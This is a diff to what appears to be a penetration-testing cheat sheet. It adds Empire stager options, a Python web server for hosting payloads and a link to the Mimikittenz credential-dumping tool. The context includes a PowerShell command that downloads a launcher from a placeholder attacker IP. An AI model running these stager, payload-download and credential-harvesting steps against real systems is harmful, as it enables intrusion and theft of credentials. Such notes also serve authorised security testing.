@@ -503,12 +503,15 @@ Copy and paste output in terminal
 
 ***If you need a stager***
 usestager multi/launcher (or whatever can run on host)
+set Base64 False
 set Listener http
+set OutFile /tmp/launcher.ps1
 execute
 
 Upload and run payload
 cd /tmp
 python -m SimpleHTTPServer 8888
+python3 -m http.server 8888
 
 powershell -c (New-Object System.Net.WebClient).DownloadFile('http://INSERTIPADDRESS:8888/launcher.bat','launcher.bat')
 
@@ -539,6 +542,10 @@ execute
 
 Exploit Suggester:
 https://github.com/bitsadmin/wesng
+
+Mimikittenz
+For userland creds in memory
+https://github.com/putterpanda/mimikittenz
 
 ```
 ### Basic info
